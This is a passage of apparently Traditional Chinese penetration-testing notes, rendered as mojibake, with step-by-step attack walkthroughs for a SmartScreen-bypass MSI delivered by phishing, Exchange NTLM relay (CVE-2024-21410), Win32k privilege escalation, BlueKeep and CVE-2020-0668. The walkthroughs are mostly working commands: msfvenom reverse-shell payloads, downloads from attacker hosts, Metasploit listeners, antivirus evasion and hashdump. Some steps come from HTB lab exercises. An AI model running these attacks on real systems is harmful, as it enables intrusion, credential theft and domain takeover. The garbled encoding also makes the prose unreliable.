#### 2Ô∏è‚É£ Âà©Áî®ÊºèÊ¥ûÂ∑•ÂÖ∑Ë£Ω‰ΩúÁπûÈÅéÊ™îÊ°à

> Github ‰∏äÊúâ PoC Á®ãÂºèÁ¢ºÔºà‰æãÂ¶ÇÁî± Will Dormann Êèê‰æõÔºâÔºåÂèØÁî® Python ÁîüÊàêÁâπÊÆä„ÄåSigned .MSI„ÄçÊ†ºÂºèÔºö

```bash
python3 SmartScreenBypassGenerator.py --input backdoor.exe --output bypass.msi
```

> Â∑•ÂÖ∑ÊúÉËá™ÂãïÂä†ÂÖ•ÁâπÂÆöÂ±¨ÊÄßËÆì SmartScreen ÁÑ°Ê≥ïÊ™¢Ê∏¨„ÄÇ

***

#### 3Ô∏è‚É£ Ê∏¨Ë©¶ÔºàÊú¨Ê©üÔºâ

> Áõ¥Êé•ÈõôÊìäÂü∑Ë°å `bypass.msi`Ôºå

* ‰∏ÄËà¨ÊÉÖÊ≥Å‰∏ãÔºåSmartScreen ÊúÉË∑≥Âá∫ÊèêÁ§∫Ôºõ
* Â¶ÇÊûúÊàêÂäüÁπûÈÅéÔºåÂü∑Ë°å‰∏çÊúÉÊúâ‰ªª‰ΩïÈòªÊìãË®äÊÅØÔºåpayload Áõ¥Êé•ÈÅãË°å„ÄÇ

***

#### 4Ô∏è‚É£ ÂØÑÈÄÅÊîªÊìä

ÂèØÈÄèÈÅé‰ª•‰∏ãÁÆ°ÈÅìÔºö

* üìß Èá£È≠öÈÉµ‰ª∂Â§æÂ∏∂ÊÉ°ÊÑè MSI
* üóÇ Êñá‰ª∂‰∏≠ÂµåÂÖ•Ë∂ÖÈÄ£ÁµêÊåáÂêëÊ™îÊ°à‰∏ãËºâ
* USB drop / QR Code Ë™òÂ∞é‰∏ãËºâ

***

### ‚ö°Ô∏è Debug & Â∏∏Ë¶ãÂïèÈ°å

| ÂïèÈ°å                | Debug Ëß£Ê≥ï                                            |
| ----------------- | --------------------------------------------------- |
| SmartScreen ÈÇÑÊòØÊúâÊîîÊà™ | Ê™¢Êü•Ëº∏Âá∫Ê™îÊ°àÂ±¨ÊÄßÔºõÁ¢∫‰øù PoC Â∑•ÂÖ∑ÁâàÊú¨Êõ¥Êñ∞                              |
| payload ÁÑ°Ê≥ïÂü∑Ë°å      | Á¢∫‰øùÁî® `-f exe` Ê†ºÂºèÔºå‰∏çË¶ÅÁî® shellcodeÔºõpayload ÊîæÂú®ÂèØÂü∑Ë°åÊ™îÂÖß       |
| Ê∏¨Ë©¶ÊôÇËß∏Áôº Defender    | ‰ΩøÁî® msfvenom Áî¢Âá∫ÂæåÔºåÂèØÁµêÂêà Veil / Shellter / Obfuscator ËôïÁêÜ |

***

### Â∞èÁ∏ΩÁµê & ‰∏ã‰∏ÄÊ≠•Âª∫Ë≠∞

| Ê≠•È©ü  | Â∑•ÂÖ∑                            | ÂäüËÉΩËàáÁõÆÁöÑ            |
| --- | ----------------------------- | ---------------- |
| 1Ô∏è‚É£ | msfvenom                      | Áî¢Áîü payload       |
| 2Ô∏è‚É£ | SmartScreenBypassGenerator.py | ÊâìÂåÖ payload ÁÇ∫ÁπûÈÅéÊ™îÊ°à |
| 3Ô∏è‚É£ | ÂØÑÈÄÅ / Á§æ‰∫§Â∑•Á®ã                     | ÂºïÂ∞éÁõÆÊ®ôÂü∑Ë°å           |
| 4Ô∏è‚É£ | Meterpreter Listener Âª∫Á´ã       | Á≠âÂæÖÂèçÂêëÈÄ£Á∑öÔºåÂæåÁ∫åÊ©´ÂêëÁßªÂãï    |

***

### ‚úÖ 1Ô∏è‚É£5Ô∏è‚É£ CVE-2024-21410 (Exchange NTLM Relay)

### üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ

CVE-2024-21410 ÊòØ‰∏ÄÂÄãÈáùÂ∞ç **Microsoft Exchange ‰º∫ÊúçÂô®** ÁöÑ NTLM Relay ÊîªÊìäÊºèÊ¥û„ÄÇ\
ÈÄôÂÄãÊºèÊ¥ûÂÖÅË®±ÊîªÊìäËÄÖÈÄèÈÅé„Äå‰∏≠ÁπºÔºàrelayÔºâ„ÄçÊ©üÂà∂Â∞á Exchange ‰º∫ÊúçÂô®ÁöÑ NTLM Ë™çË≠âÁôºÈÄÅÂà∞ Active Directory Certificate Services (AD CS)ÔºåÈÄ≤ËÄåÂèñÂæó Kerberos Á•®ÊìöÔºàTGTÔºâÊàñÈÄ≤‰∏ÄÊ≠•ÊèêÊ¨äÊàê Domain Admin„ÄÇ

#### ÁÇ∫‰ªÄÈ∫º‰ºÅÊ•≠Ë¶ÅÈáçË¶ñÔºü

* Exchange ÈÄöÂ∏∏ÊòØÈñãÊîæÂ∞çÂ§ñÊúçÂãôÔºà‰æãÂ¶Ç OWA„ÄÅECPÔºâ„ÄÇ
* ÊîªÊìäËÄÖÂèØÁÑ°ÈúÄÂ∏≥ËôüÔºåÈÄèÈÅé Exchange ÁöÑÂõûÊáâ‰æÜÈÄ≤Ë°å NTLM relay„ÄÇ
* ‰∏ÄÊó¶ÊàêÂäüÔºå‰∏≠ÁπºÊîªÊìäÂèØ‰ª•Â∞éËá¥Êï¥ÂÄã AD ÊéßÂà∂Ê¨äÊ∑™Èô∑„ÄÇ
* ÊîªÊìäÊñπÂºèËøë‰πé„ÄåÁÑ°Ê™îÊ°à„ÄçÊîªÊìäÔºàfilelessÔºâÔºåÈõ£‰ª•ËøΩËπ§„ÄÇ

***

### üöÄ ÊîªÊìäÊµÅÁ®ãÂúñÔºàÊñáÂ≠óÁâàÔºâ

```
1Ô∏è‚É£ ÊîªÊìäËÄÖÁõ£Êéß Exchange NTLM Ë´ãÊ±Ç  
       ‚Üì
2Ô∏è‚É£ Âà©Áî® Exchange ÂõûÊáâ‰∏≠Áπº NTLM Ë≥áË®ä  
       ‚Üì
3Ô∏è‚É£ Â∞á Relay Â∞éÂêë AD CS (AD ÊÜëË≠âÊúçÂãô)  
       ‚Üì
4Ô∏è‚É£ AD CS È†íÁôºÊÜëË≠âÔºàTGTÔºâÁµ¶ÊîªÊìäËÄÖ  
       ‚Üì
5Ô∏è‚É£ ‰ΩøÁî®ÊÜëË≠âË´ãÊ±Ç Kerberos TGT  
       ‚Üì
6Ô∏è‚É£ ‰ΩøÁî® TGT ÈÄ≤Ë°åÊ©´ÂêëÁßªÂãïÔºåÊèêÊ¨äÊàê Domain Admin  
```

***

### üë®‚Äçüè´ ÊîªÊìäÊ≠•È©üÁØÑ‰æã

#### ‚úÖ ÊîªÊìäÂâçÊèêÔºö

* ÁõÆÊ®ôÁ∂≤ÂüüÂÖßÊúâ **Microsoft Exchange** ‰∏î Exchange Web Services Â∞çÂ§ñÈñãÊîæ„ÄÇ
* AD CS (ÊÜëË≠âÊúçÂãô) Â∑≤ÈÉ®ÁΩ≤‰∏¶ÂÖÅË®±Ëá™Âä©ÂûãÊÜëË≠âË®ªÂÜä„ÄÇ

***

#### 1Ô∏è‚É£ Á¢∫Ë™ç Exchange ÊòØÂê¶ÂèØ‰∏≠Áπº

```bash
nmap -p 443 --script=http-ntlm-info <exchange_ip>
```

* Â¶ÇÊûúÂõûÂÇ≥ NTLM Ë≥áË®äÔºàDomain/Host/VersionÔºâÔºå‰ª£Ë°®ÂèØ‰ª•ÈÄ≤Ë°å Relay ÊîªÊìä„ÄÇ

***

#### 2Ô∏è‚É£ Âà©Áî® ntlmrelayx (Impacket Â∑•ÂÖ∑) Ë®≠ÁΩÆ‰∏≠ÁπºÊîªÊìä

```bash
ntlmrelayx.py -t http://<AD_CS_IP>/certsrv/certfnsh.asp -smb2support --adcs
```

* `-t`ÔºöË®≠ÂÆö‰∏≠ÁπºÁõÆÊ®ô
* `--adcs`ÔºöÂ∞àÁÇ∫ AD CS Ë™çË≠â‰∏≠ÁπºÊ®°Âºè

***

#### 3Ô∏è‚É£ Âà©Áî® Exchange NTLM Ë´ãÊ±Ç‰∏≠Áπº

* ‰ΩøÁî® responder / mitm6 Âª∫Á´ã‰º∫ÊúçÂô®Ë™òÈ®ô Exchange Ëá™Ë°åÂòóË©¶È©óË≠âÔºö

```bash
responder -I eth0 -wrf
```

* ÂêåÊôÇÈÅãË°å ntlmrelayxÔºåÁ≠âÂæÖ Exchange Ëá™ÂãïÈÄ≤Ë°å NTLM ÊµÅÈáè‰∏≠Áπº„ÄÇ

***

#### 4Ô∏è‚É£ Â¶ÇÊûúÊàêÂäüÔºåntlmrelayx ÊúÉÂõûÂÇ≥Ôºö

```bash
[*] Successfully relayed credentials to AD CS
[*] Certificate successfully retrieved and saved as: administrator.pfx
```

***

#### 5Ô∏è‚É£ ËΩâÊèõ PFX ÊÜëË≠âÁÇ∫ kirbi

```bash
certipy auth -pfx administrator.pfx -dc-ip <dc_ip> -target <domain.local>
```

* Certipy ÊúÉÂèñÂæó TGTÔºå‰æõÂæåÁ∫å pass-the-ticket ÊîªÊìä‰ΩøÁî®„ÄÇ

***

#### 6Ô∏è‚É£ ‰ΩøÁî® Kerberos TGT ÊèêÊ¨ä

```bash
export KRB5CCNAME=administrator.ccache
impacket-psexec <domain>/administrator@<victim_ip>
```

* Ê≠§ÊôÇÂ∑≤ÊàêÂäüÂèñÂæó Domain Admin Ê¨äÈôê„ÄÇ

***

### ‚ö°Ô∏è Debug & Â∏∏Ë¶ãÂïèÈ°å

| ÂïèÈ°å               | Ëß£Ê≥ï                                           |
| ---------------- | -------------------------------------------- |
| NTLM Relay ÁÑ°ÂõûÊáâ   | Á¢∫Ë™ç Exchange ÁâàÊú¨Âèä AD CS Ë®≠ÂÆöÔºåExchange ÂøÖÈ†àÂÖÅË®± NTLM  |
| AD CS ÁÑ°Ê≥ïÁ∞ΩÁôºÊÜëË≠â     | Ê™¢Êü• AD CS ÊòØÂê¶ÈñãÂïü„ÄåWeb Enrollment„ÄçÔºå‰ª•ÂèäÊòØÂê¶ÂÖÅË®± AD ÊÜëË≠âË®ªÂÜä |
| ÊÜëË≠âËΩâÊèõ kirbi ÊôÇÂá∫ÁèæÈåØË™§ | Á¢∫Ë™ç‰ΩøÁî®ÁöÑ certipy ÁâàÊú¨Âèä openssl ÊòØÂê¶ÊîØÊè¥ pfx Ê†ºÂºè        |

***

### ‚úÖ 1Ô∏è‚É£6Ô∏è‚É£ CVE-2024-21338 (Win32k.sys ÊèêÊ¨ä)

### üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ

CVE-2024-21338 ÊòØÈáùÂ∞ç **Windows Win32k.sys** È©ÖÂãïÁöÑÊú¨Âú∞Ê¨äÈôêÊèêÂçáÊºèÊ¥ûÔºå\
ÊîªÊìäËÄÖËã•Â∑≤ÂèñÂæó‰ΩéÊ¨äÈôêÂ≠òÂèñÔºåÈÄèÈÅéÂà©Áî® Win32k Ê†∏ÂøÉÂÖÉ‰ª∂ API ÂëºÂè´Ôºå\
ÂèØ‰ª•Âú®Êú¨Ê©üÊèêÊ¨äÁÇ∫ SYSTEMÔºå\
‰∏¶ÈÄ≤‰∏ÄÊ≠•Áî®ÊñºÁ∂≠ÊåÅÂæåÈñÄ„ÄÅÊ©´ÂêëÁßªÂãïÊàñÊ≥®ÂÖ•ÊÉ°ÊÑèÁ®ãÂºè„ÄÇ

#### ÁÇ∫‰ªÄÈ∫º‰ºÅÊ•≠Ë¶ÅÈáçË¶ñÔºü

* Ê≠§ÊºèÊ¥ûÂΩ±Èüø **Windows 10„ÄÅWindows 11„ÄÅWindows Server 2019/2022**„ÄÇ
* Ë¢´ÂàóÁÇ∫„ÄåAPT Âú®ÈáéÂà©Áî®‰∏≠„ÄçÔºå‰ª£Ë°®ÊîªÊìäËÄÖÂ∑≤Á∂ìÂú®ÁúüÂØ¶ÊîªÊìä‰∏≠‰ΩøÁî®„ÄÇ
* ÊîªÊìäÈñÄÊ™ª‰ΩéÔºå‰∏îÁèæÊàê PoC Â∑≤Âá∫Áèæ„ÄÇ
* Êú¨Âú∞ÊºèÊ¥ûÂèØÁµêÂêàÂÖ∂‰ªñÊîªÊìäÔºàÂ¶ÇÈá£È≠ö„ÄÅÊÉ°ÊÑè Office Êñá‰ª∂ÔºâÂø´ÈÄüÂèñÂæó SYSTEM Ê¨äÈôê„ÄÇ

***

### üöÄ ÊîªÊìäÊµÅÁ®ãÂúñÔºàÊñáÂ≠óÁâàÔºâ

```
1Ô∏è‚É£ ÊîªÊìäËÄÖÂèñÂæó‰ΩéÊ¨äÈôê shell  
       ‚Üì
2Ô∏è‚É£ ‰∏äÂÇ≥ CVE-2024-21338 exploit (PoC)  
       ‚Üì
3Ô∏è‚É£ Âà©Áî®ÊºèÊ¥ûÂëºÂè´ win32k.sys ÁâπÂÆö API  
       ‚Üì
4Ô∏è‚É£ Ê¨äÈôêÊèêÂçáËá≥ NT AUTHORITY\SYSTEM  
       ‚Üì
5Ô∏è‚É£ Âü∑Ë°å‰ªªÊÑèÂæåÈñÄ„ÄÅÊ©´ÂêëÁßªÂãïÊàñÊÜëË≠âÁ´äÂèñ  
```

***

### üë®‚Äçüè´ ÊîªÊìäÊ≠•È©üÁØÑ‰æã

#### 1Ô∏è‚É£ ÂâçÊúüÊ∫ñÂÇô

Á¢∫Ë™çÁõÆÂâçÊ¨äÈôêÔºö

```bash
whoami
whoami /priv
```

* Á¢∫Ë™çÁÇ∫‰∏ÄËà¨‰ΩøÁî®ËÄÖÊàñ‰ΩéÊ¨äÈôê‰ΩøÁî®ËÄÖÁãÄÊÖã„ÄÇ

***

#### 2Ô∏è‚É£ ‰∏äÂÇ≥Â∑≤Á∑®Ë≠ØÁöÑ CVE-2024-21338 Âà©Áî®Á®ãÂºè

ÂÅáË®≠ exploit Ê™îÂêçÁÇ∫Ôºö`21338exploit.exe`\
‰ΩøÁî® PowerShell ÂÇ≥ÈÄÅÊ™îÊ°àÔºö

```powershell
Invoke-WebRequest -Uri http://attacker-server/21338exploit.exe -OutFile C:\Windows\Temp\21338exploit.exe
```

***

#### 3Ô∏è‚É£ Âü∑Ë°åÊºèÊ¥ûÂà©Áî®

```powershell
cd C:\Windows\Temp
.\21338exploit.exe
```

* Â¶ÇÊûúÊàêÂäüÔºåÊúÉË∑≥Âá∫ SYSTEM shell ÊàñÊñ∞Â¢û SYSTEM Á≠âÁ¥öÂèçÂêëÈÄ£Á∑ö„ÄÇ

***

#### 4Ô∏è‚É£ Á¢∫Ë™çÊòØÂê¶ÊèêÊ¨äÊàêÂäü

```bash
whoami
```

È†êÊúüËº∏Âá∫ÁµêÊûúÔºö

```
nt authority\system
```

***

#### 5Ô∏è‚É£ Âà©Áî® SYSTEM Ê¨äÈôêÊ©´ÂêëÁßªÂãï

```bash
impacket-secretsdump -target-ip <victim_ip> -hashes <NTLM hash> administrator@<target>
```

ÊàñËÄÖÂ∞á SYSTEM Ê¨äÈôêÂèçÂêëÈÄ£ÂõûÔºö

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<your_ip> LPORT=443 -f exe > system_payload.exe
```

ÁÑ∂ÂæåÂæû SYSTEM Ê¨äÈôêÂü∑Ë°å `system_payload.exe`„ÄÇ

***

### üîé Debug & Â∏∏Ë¶ãÂïèÈ°å

| ÂïèÈ°å                 | Ëß£Ê±∫ÊñπÂºè                                         |
| ------------------ | -------------------------------------------- |
| exploit.exe Âü∑Ë°åÊ≤íÊúâÂõûÊáâ | Á¢∫Ë™ç Windows ÁâàÊú¨Ëàá PoC Áõ∏ÂÆπÊÄßÔºõÈúÄË¶ÅÊîØÊè¥ win32k.sys ÂëºÂè´ÊºèÊ¥û  |
| Âü∑Ë°åÊôÇÂá∫ÁèæÊ¨äÈôê‰∏çË∂≥          | ‰ΩøÁî® `runas /user:Administrator` ÊàñÁ¢∫‰øùÁÇ∫‰ΩéÊ¨äÈôê shell |
| Ê≤íÊúâ SYSTEM ÂõûÊáâÊàñ‰∏≠Êñ∑    | ÂòóË©¶Âú®ËºÉ‰ΩéÁâàÊú¨ (Windows 10 21H2) ÈáçÊñ∞Âü∑Ë°å               |

***

### ‚úÖ 1Ô∏è‚É£7Ô∏è‚É£ BlueKeep (CVE-2019-0708)

### üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ

**CVE-2019-0708ÔºàBlueKeepÔºâ** ÊòØ Windows ÈÅ†Á´ØÊ°åÈù¢ÊúçÂãôÔºàRDPÔºâÁöÑÈáçÂ§ßÊºèÊ¥ûÔºå\
Â±¨ÊñºÊú™ÊéàÊ¨äÈÅ†Á´ØÁ®ãÂºèÁ¢ºÂü∑Ë°å (RCE) È°ûÂûãÔºå\
ÂÖÅË®±ÊîªÊìäËÄÖÂú®Ê≤íÊúâ‰ªª‰ΩïÂ∏≥ËôüÊÜëË≠â‰∏ãÁõ¥Êé•Âà©Áî® RDP Âü† (3389) Âü∑Ë°å‰ªªÊÑè‰ª£Á¢ºÔºå\
ÂΩ±Èüø Windows XP„ÄÅWindows 7„ÄÅWindows Server 2003/2008„ÄÇ

#### ‰ºÅÊ•≠È¢®Èö™Ë™™Êòé

* Ê≠§ÊºèÊ¥ûÂÖ∑ÂÇô„ÄåË†ïËü≤ÂºèÂÇ≥Êí≠„ÄçÁâπÊÄßÔºåÈ°û‰ººÊñºÁï∂Âπ¥ÁöÑ WannaCry ÊîªÊìä„ÄÇ
* Ëã•‰ºÅÊ•≠ÂÖßÈÉ®ÊúâÊú™Êõ¥Êñ∞Á≥ªÁµ±ÊàñÊö¥Èú≤ RDP Âü†Âú®Â§ñÁ∂≤ÔºåÈùûÂ∏∏ÂÆπÊòìË¢´ÊéÉÊèèËàáËá™ÂãïÂåñÂà©Áî®„ÄÇ
* ÊîªÊìäÊàêÂäüÂæåÔºåÊîªÊìäËÄÖÂèØ‰ª•Áõ¥Êé•ÂèñÂæó SYSTEM Ê¨äÈôêÂü∑Ë°å‰ªªÊÑèË°åÂãï„ÄÇ

***

### üöÄ ÊîªÊìäÊµÅÁ®ãÂúñÔºàÊñáÂ≠óÁâàÔºâ

```
1Ô∏è‚É£ ÂÅµÊ∏¨ÁõÆÊ®ôÊòØÂê¶ÈñãÊîæ RDP ÊúçÂãô  
      ‚Üì  
2Ô∏è‚É£ ‰ΩøÁî® Nmap + NSE ËÖ≥Êú¨Á¢∫Ë™çÊºèÊ¥ûÊòØÂê¶Â≠òÂú®  
      ‚Üì  
3Ô∏è‚É£ Âà©Áî® Metasploit Ê®°ÁµÑÊàñ Standalone exploit ÈÄ≤Ë°åÊîªÊìä  
      ‚Üì  
4Ô∏è‚É£ ÊàêÂäüÂà©Áî®ÂæåÂèñÂæó SYSTEM Ê¨äÈôê  
      ‚Üì  
5Ô∏è‚É£ Âª∫Á´ãÂæåÈñÄ„ÄÅÊäìÂèñÊÜëË≠â„ÄÅÊ©´ÂêëÁßªÂãï  
```

***

### üë®‚Äçüè´ ÊîªÊìäÊ≠•È©üÁØÑ‰æã

#### 1Ô∏è‚É£ ÂÅµÊ∏¨ÁõÆÊ®ô RDP Âü†

```bash
nmap -p 3389 -sV <target-ip>
```

Â¶ÇÊûúÁúãÂà∞Ôºö

```
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

‰ª£Ë°® RDP ÈñãÂïü‰∏≠„ÄÇ

***

#### 2Ô∏è‚É£ Á¢∫Ë™ç BlueKeep ÊºèÊ¥ûÂ≠òÂú®

‰ΩøÁî® Nmap NSE ËÖ≥Êú¨Ôºö

```bash
nmap -p 3389 --script rdp-vuln-ms12-020 <target-ip>
```

Â¶ÇÊûúÁõÆÊ®ôÂõûÊáâÊúâ "VULNERABLE"ÔºåÈÄöÂ∏∏ BlueKeep Â≠òÂú®„ÄÇ

***

#### 3Ô∏è‚É£ ‰ΩøÁî® Metasploit Âà©Áî®

ÈñãÂïü MetasploitÔºö

```bash
msfconsole
```

ËºâÂÖ•Ê®°ÁµÑÔºö

```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <target-ip>
set RPORT 3389
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
exploit
```

‚ö† Ê≥®ÊÑèÔºöÊ≠§ÊºèÊ¥ûÂÆπÊòìÂ∞éËá¥Á≥ªÁµ± BSODÔºåÂª∫Ë≠∞ÂØ¶È©óÁí∞Â¢É‰ΩøÁî®ÔºÅ

***

#### 4Ô∏è‚É£ Á¢∫Ë™çÊòØÂê¶ÂèñÂæó SYSTEM

Âú® Meterpreter ÂèñÂæóÈÄ£Á∑öÂæåÔºö

```bash
meterpreter > getuid
```

È†êÊúüËº∏Âá∫Ôºö

```
Server username: NT AUTHORITY\SYSTEM
```

***

#### 5Ô∏è‚É£ ÂæåÁ∫åÊ©´ÂêëÁßªÂãï

* ÂèØ‰ª•ÈÄ≤Ë°åÊÜëË≠âËΩâÂÑ≤ (mimikatz)
* Êàñ‰ΩøÁî® `psexec` Ê®°ÁµÑÈÄ≤Ë°åÂÖßÁ∂≤Ê©´ÂêëÁßªÂãï„ÄÇ

***

### üõ† Â∑•ÂÖ∑Êé®Ëñ¶

| Â∑•ÂÖ∑                       | Áî®ÈÄî                       |
| ------------------------ | ------------------------ |
| Nmap + NSE               | ÊéÉÊèè‰∏¶ÂÅµÊ∏¨ÊòØÂê¶Â≠òÂú®ÊºèÊ¥û              |
| Metasploit BlueKeep Ê®°ÁµÑ   | Ëá™ÂãïÂåñÊºèÊ¥ûÂà©Áî®                  |
| RDPBlueKeep (Standalone) | Python Êàñ C Á∑®ÂØ´ÁöÑÁç®Á´ã exploit |

### ‚úÖ 1Ô∏è‚É£8Ô∏è‚É£ Windows Ê†∏ÂøÉÁöÑ„Äå‰ªªÊÑèÊ™îÊ°àÁßªÂãï„ÄçÊ¨äÈôêÊèêÂçáÊºèÊ¥û  (CVE-2020-0668)



### üöÄ CVE-2020-0668 ÊîªÊìäÊµÅÁ®ãÂúñ (ÊñáÂ≠óÁâà)

```
1Ô∏è‚É£ Á¢∫Ë™ç‰ΩøÁî®ËÄÖÊ¨äÈôê (whoami /priv)
        ‚Üì
2Ô∏è‚É£ ÊâæÂ∞ãÁõÆÊ®ôÂèØÂØ´ÂÖ•Á≥ªÁµ±Ê™îÊ°à (‰æãÂ¶Ç Mozilla Maintenance Service)
        ‚Üì
3Ô∏è‚É£ ‰ΩøÁî® msfvenom Âª∫Á´ãÊÉ°ÊÑè EXEÔºàÂèçÂêëÈÄ£Êé• MeterpreterÔºâ
        ‚Üì
4Ô∏è‚É£ Â∞áÊÉ°ÊÑèÊ™îÊ°àÂÇ≥ÈÄÅËá≥ÁõÆÊ®ô (ÈÄèÈÅé wget / curl)
        ‚Üì
5Ô∏è‚É£ ‰ΩøÁî®ÊºèÊ¥ûÁ®ãÂºèÂ∞áÊÉ°ÊÑèÊ™îÊ°àÊê¨ÁßªÂà∞Á≥ªÁµ±ÁõÆÈåÑ
        ‚Üì
6Ô∏è‚É£ ‰ΩøÁî® icacls È©óË≠âÂèØÊéßÊ¨äÈôê
        ‚Üì
7Ô∏è‚É£ Áî®Êú™ÊêçÂ£ûÂâØÊú¨Ë¶ÜËìãÁ≥ªÁµ±Âü∑Ë°åÊ™î
        ‚Üì
8Ô∏è‚É£ ÂïüÂãïÊúçÂãôÔºåÂèñÂæó SYSTEM Ê¨äÈôêÂõûÈÄ£
        ‚Üì
9Ô∏è‚É£ ‰ΩøÁî® meterpreter shell ÂÆåÊï¥ÊèêÊ¨ä + dump hash
```

***

### üë®‚Äçüè´ ÊîªÊìäÊ≠•È©üÁØÑ‰æã + Â∑•ÂÖ∑Êåá‰ª§

#### üîé 1. Á¢∫Ë™çÁõÆÂâçÂ∏≥ËôüÊ¨äÈôê

```bash
whoami /priv
```

**ÁõÆÁöÑ**ÔºöÁ¢∫Ë™çÁõÆÂâçÂ∏≥ËôüÊòØÂê¶ÁÇ∫‰ΩéÊ¨äÈôêÔºå‰∏¶Ê∫ñÂÇôÊ¨äÈôêÊèêÂçá„ÄÇ

***

#### üîé 2. ÊâæÁ≥ªÁµ±ÂèØÂà©Áî®ÁõÆÊ®ô

```bash
icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

**ÁµêÊûú**ÔºöÁúãÂà∞ `BUILTIN\Users:(I)(RX)` Ë°®Á§∫ÂèØ‰ª•Âü∑Ë°åÔºå‰ΩÜ‰∏çÂèØÊîπÂØ´ÔºåÈúÄË¶ÅÂà©Áî®ÊºèÊ¥û‰æÜ‰øÆÊîπÊ¨äÈôê„ÄÇ

***

#### ‚öí 3. Ë£Ω‰ΩúÊÉ°ÊÑè EXE

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=‰Ω†ÁöÑIP LPORT=8443 -f exe > maintenanceservice.exe
```

**ÁõÆÁöÑ**ÔºöÂª∫Á´ãÊÉ°ÊÑèÂèçÂêë shell EXE„ÄÇ

***

#### üì• 4. ÂÇ≥ÈÄÅÊÉ°ÊÑèÊ™îÊ°àÂà∞ÁõÆÊ®ô

```bash
python3 -m http.server 8080
# Âú®ÁõÆÊ®ôÊ©üÂô®‰∏ãËºâ
wget http://ÊîªÊìäÊ©üIP:8080/maintenanceservice.exe -O maintenanceservice.exe
wget http://ÊîªÊìäÊ©üIP:8080/maintenanceservice.exe -O maintenanceservice2.exe
```

**Ë™™Êòé**Ôºö‰∏ãËºâÂÖ©ÂÄãÂâØÊú¨Ôºå‰∏ÄÂÄãÁî®‰æÜÊê¨ÁßªÔºå‰∏ÄÂÄãÂÇôÁî®„ÄÇ

***

#### üì¶ 5. Âà©Áî® CVE-2020-0668 Êê¨ÁßªÊ™îÊ°à

```bash
C:\Tools\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

**Ë™™Êòé**ÔºöÈÄèÈÅéÊºèÊ¥ûÁ®ãÂºèÂ∞áÊÉ°ÊÑè EXE Êê¨ÈÄ≤Á≥ªÁµ±ÁõÆÈåÑ„ÄÇ

***

#### ‚úÖ 6. È©óË≠âÊ¨äÈôê

```bash
icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

**ÊáâË©≤ÁúãÂà∞**Ôºö`WINLPE-WS02\htb-student:(F)` ÊÑèÂë≥ËëóÊìÅÊúâÂÆåÊï¥ÊéßÂà∂Ê¨ä„ÄÇ

***

#### üîÅ 7. Ë¶ÜËìãË¢´Á†¥Â£ûÁöÑ EXE

```cmd
copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

> Ê≥®ÊÑèÔºöÂè™ËÉΩÁî® `cmd.exe`ÔºåPowerShell ÊúÉÂá∫ÈåØ„ÄÇ

***

#### üèÅ 8. Ë®≠ÂÆö metasploit listener

Âª∫Á´ã `handler.rc`Ôºö

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST ÊîªÊìäÊ©üIP
set LPORT 8443
exploit
```

ÁÑ∂ÂæåÂü∑Ë°åÔºö

```bash
msfconsole -r handler.rc
```

***

#### üöÄ 9. ÂïüÂãïÁõÆÊ®ôÊúçÂãôÔºàËß∏ÁôºÊºèÊ¥ûÔºâ

```bash
net start MozillaMaintenance
```

> Âç≥‰æøÈåØË™§Ë®äÊÅØÂá∫ÁèæÔºå‰ªçÁÑ∂ÊúÉËß∏ÁôºÂèçÂêëÈÄ£Êé•ÔºÅ

***

#### üíª 10. Êé•Êî∂Âà∞ Meterpreter ÂõûÈÄ£

```bash
meterpreter > getuid
meterpreter > sysinfo
meterpreter > hashdump
```

> ÊàêÂäüÊãøÂà∞ NT AUTHORITY\SYSTEM Ê¨äÈôê‰∏¶ÂèØÈñãÂßãÂæåÁ∫åÊ©´ÂêëÁßªÂãïÔºÅ

***

### üìù Â∞èÁ∏ΩÁµêÔºö

* CVE-2020-0668 ÊòØ‰∏ÄÂÄã„ÄåÈñìÊé•ÊèêÊ¨ä„ÄçÊºèÊ¥ûÔºåÈúÄË¶ÅÁµêÂêàÁ¨¨‰∏âÊñπÊúçÂãôÊàñÂÖ∂‰ªñËºâÂÖ•ÊäÄË°ì„ÄÇ
* ÈÄöÂ∏∏Ëàá **Mozilla Maintenance Service** Êê≠ÈÖç‰ΩøÁî®ÊúÄÂÆπÊòìÊàêÂäü„ÄÇ
* ÈÅãÁî®ÊºèÊ¥ûÂæåË¶ÅÁ´ãÂç≥Áî®ÂÇô‰ªΩÂâØÊú¨Ë¶ÜËìãÔºåÈÅøÂÖçÊêçÂ£ûÂ∞éËá¥Á≥ªÁµ±Áï∞Â∏∏„ÄÇ
* ÊàêÂäüÂõûÈÄ£ÂæåÔºåÁ¨¨‰∏ÄÊ≠•ÂÖà `getuid` Á¢∫Ë™ç SYSTEM Ê¨äÈôêÔºåÁ¨¨‰∫åÊ≠• `hashdump` ÊíàÂ∏≥ËôüÂØÜÁ¢ºÂìàÂ∏å„ÄÇ
* ÂèØÁî®ÊñºÁ¥ÖÈöäÊª≤ÈÄèËàá CTF Windows Ê¨äÈôêÊèêÂçáÈ°åÁõÆ„ÄÇ

</details>

<details>

<summary>‰∏≠ÊØíÊîªÊìä   ÁîüÊàêÊÉ°ÊÑè MSI ‰∏¶Âª∫Á´ãÂèçÂêëÈÄ£Á∑ö</summary>



‚úÖ ‰ΩøÁî® msfvenom ÁîüÊàêÊÉ°ÊÑè MSI ‰∏¶Âª∫Á´ãÂèçÂêëÈÄ£Á∑ö&#x20;

***

## 1Ô∏è‚É£ ÊîªÊìäÁõÆÊ®ôÊ¶ÇÂøµÔºö

